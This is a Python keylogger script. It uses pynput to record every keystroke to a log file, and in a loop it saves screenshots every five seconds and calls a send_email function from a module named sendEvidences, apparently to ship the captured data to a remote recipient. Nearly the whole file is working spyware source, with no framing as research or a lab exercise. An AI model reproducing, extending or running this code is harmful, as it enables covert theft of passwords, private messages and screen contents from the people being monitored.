#coding: utf-8
# -*- coding:utf-8 -*-

from resources.sendEvidences import send_email, save_screenshot
from utils.style import style
from pynput.keyboard import Key, Listener
import time

class service(Exception):pass

count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(style.OKGREEN + "{0} pressed".format(key) + style.ENDC)
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('archives/Logs.txt', "a") as f:  #Save Log

        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(str(' '))
            elif k.find("caps_lock") > 0:
                f.write(str("<CAPS_LOCK>"))
            elif k.find("enter") > 0:
                f.write(str("\n"))
            elif k.find("<96>") > -1:
                f.write(str("0"))
            elif k.find("<97>") > -1:
                f.write(str("1"))
            elif k.find("<98>") > -1:
                f.write(str("2"))
            elif k.find("<99>") > -1:
                f.write(str("3"))
            elif k.find("<100>") > -1:
                f.write(str("4"))
            elif k.find("<101>") > -1:
                f.write(str("5"))
            elif k.find("<102>") > -1:
                f.write(str("6"))
            elif k.find("<103>") > -1:
                f.write(str("7"))
            elif k.find("<104>") > -1:
                f.write(str("8"))
            elif k.find("<105>") > -1:
                f.write(str("9"))
            elif k.find("Key") == -1:
                f.write(k)
                
def on_release(key):
    if key == Key.esc: #Kills the process
        exit()
    
with Listener(
        on_press=on_press,on_release=on_release) as listener:
    try:
        while True:
            time.sleep(5)
            save_screenshot()
            send_email()
        listener.join()
        
    except KeyboardInterrupt:
        print(style.OKBLUE + 'Program Ended!' + style.ENDC)

